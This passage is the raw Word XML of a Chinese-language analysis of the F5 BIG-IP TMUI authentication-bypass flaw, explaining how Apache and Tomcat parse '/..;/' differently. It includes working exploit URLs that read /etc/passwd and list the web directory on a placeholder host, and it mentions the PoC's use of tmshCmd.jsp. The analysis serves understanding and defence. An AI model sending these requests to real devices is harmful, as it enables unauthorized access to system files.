    <w:p w14:paraId="23D94C45" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRPr="008F0249" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:moveTo w:id="322" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="323" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="008F0249">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="008F0249">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>/..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="008F0249">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="7835D35B" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:rPr>
          <w:ins w:id="324" w:author="芮志清" w:date="2020-07-10T11:58:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="325" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="326" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F0FCB90" wp14:editId="7C013970">
              <wp:extent cx="5731510" cy="1206924"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="15" name="Picture 9" descr="A picture containing table, display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4.png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2069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624FAEDB" w14:textId="60455840" w:rsidR="00EA14FB" w:rsidRPr="0054236F" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:moveTo w:id="327" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="328" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="329" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>图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SEQ </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:instrText>图</w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> \* ARABIC</w:instrText>
        </w:r>
        <w:r>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="330" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>7</w:t>
        </w:r>
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>读取</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>www</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>目录下的所有文件</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:moveToRangeEnd w:id="168"/>
    <w:p w14:paraId="3C15C93B" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRPr="008C2A9F" w:rsidRDefault="00EA14FB" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54A5AB4B" w14:textId="7E5D7E73" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:del w:id="331" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>发现过程</w:delText>
        </w:r>
      </w:del>
      <w:bookmarkStart w:id="332" w:name="_Toc45275585"/>
      <w:ins w:id="333" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r w:rsidR="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>漏洞原理解析</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="332"/>
    </w:p>
    <w:p w14:paraId="72A93EB3" w14:textId="755DF262" w:rsidR="00422B7D" w:rsidRDefault="00EA14FB" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:ins w:id="334" w:author="芮志清" w:date="2020-07-10T11:42:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>研究人员发布的漏洞验证</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>Po</w:t>
        </w:r>
        <w:r>
          <w:t>C</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>程序利用</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="335" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>了</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="002A1A51">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>fileRead.jsp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="002A1A51">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="002A1A51">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>tmshCmd.js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00422B7D" w:rsidRPr="002A1A51">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:del w:id="336" w:author="芮志清" w:date="2020-07-10T11:42:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>虽然是在</w:delText>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>PoC</w:delText>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>中最终被利用的文件</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="337" w:author="芮志清" w:date="2020-07-10T11:42:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>文件</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="338" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>发起攻击</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，但是</w:t>
      </w:r>
      <w:ins w:id="339" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>它</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="340" w:author="芮志清" w:date="2020-07-10T11:43:00Z">
        <w:r w:rsidR="00422B7D" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>他</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>们并不是漏洞的起因。此漏洞的本质是利用</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和后台</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Java(tomcat)</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的解析方式不同来绕过登陆限制</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在未授权的情况下，访问后台</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>JSP</w:t>
      </w:r>
      <w:r w:rsidR="00422B7D">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D74CCA" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>F5 BIG-IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的后台服务器对收到了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>请求进行了</w:t>
      </w:r>
      <w:r w:rsidRPr="00067BB7">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>两次的解析</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，第一次是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">httpd(Apache), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>第二次是后一层的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Java(tomcat)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA9D3A7" w14:textId="63C90CB1" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>最关键的点：在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在第一次被</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>解析时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>关注的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的前半段</w:t>
      </w:r>
      <w:ins w:id="341" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidR="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5D296138" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D"/>
    <w:p w14:paraId="178379FD" w14:textId="5F8E11E8" w:rsidR="00422B7D" w:rsidRDefault="00FF4EC1" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="342" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="343" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="344" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr/>
            </w:rPrChange>
          </w:rPr>
          <w:delInstrText xml:space="preserve"> HYPERLINK </w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:rPrChange w:id="345" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00422B7D" w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rPrChange w:id="346" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>https://&lt;IP&gt;/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:delText>
        </w:r>
        <w:r w:rsidRPr="00D972A6" w:rsidDel="00EA14FB">
          <w:rPr>
            <w:rPrChange w:id="347" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:del>
      <w:ins w:id="348" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidR="00EA14FB" w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="349" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00EA14FB" w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="350" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>/..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00EA14FB" w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="351" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="29EB8DD1" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRPr="002D6F43" w:rsidRDefault="00422B7D" w:rsidP="00422B7D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CAC5986" w14:textId="488E689A" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>当</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在看见前半段是合法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>且是允许被访问的页面时，</w:t>
      </w:r>
      <w:ins w:id="352" w:author="芮志清" w:date="2020-07-10T11:59:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>将</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="353" w:author="芮志清" w:date="2020-07-10T11:59:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>就</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="354" w:author="芮志清" w:date="2020-07-10T11:59:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>其</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="355" w:author="芮志清" w:date="2020-07-10T11:59:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>把它</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>交给了后面的第二层。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Apache</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>在这里完全</w:t>
      </w:r>
      <w:ins w:id="356" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>忽视了</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="357" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>把</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:ins w:id="358" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>中</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="359" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidRPr="00E24169" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:rPrChange w:id="360" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>里面</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:rPrChange w:id="361" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
              <w:highlight w:val="yellow"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>关键的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
          <w:rPrChange w:id="362" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
            <w:rPr>
              <w:highlight w:val="yellow"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>/..;/</w:t>
      </w:r>
      <w:del w:id="363" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidRPr="00EE6F2B" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:highlight w:val="yellow"/>
          </w:rPr>
          <w:delText>给无视了</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF35847" w14:textId="5FEC911D" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00B92280">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/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在第二次被解析时，后面的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Java(tomcat)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>会</w:t>
      </w:r>
      <w:ins w:id="364" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidR="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>将</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="365" w:author="芮志清" w:date="2020-07-10T12:00:00Z">
        <w:r w:rsidRPr="00E24169" w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:hint="eastAsia"/>
            <w:highlight w:val="yellow"/>
            <w:rPrChange w:id="366" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>把</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
          <w:rPrChange w:id="367" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>/.</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E24169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:highlight w:val="yellow"/>
          <w:rPrChange w:id="368" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:t>.;/</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>理解为</w:t>
      </w:r>
      <w:del w:id="369" w:author="芮志清" w:date="2020-07-10T12:01:00Z">
        <w:r w:rsidDel="00E24169">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:delText>，</w:delText>
        </w:r>
      </w:del>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>向上返回一层路径。此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>, /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和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> /..;/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>会抵消掉。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>Tomcat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>看到的真正请求从</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348E532A" w14:textId="77777777" w:rsidR="00422B7D" w:rsidRDefault="00422B7D" w:rsidP="00422B7D"/>
    <w:p w14:paraId="53195503" w14:textId="3761A3F2" w:rsidR="00422B7D" w:rsidRPr="00EE6F2B" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="370" w:author="芮志清" w:date="2020-07-10T11:44:00Z">
        <w:r w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="371" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="372" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>/..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00D972A6">
          <w:rPr>
            <w:rPrChange w:id="373" w:author="芮志清" w:date="2020-07-10T12:22:00Z">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
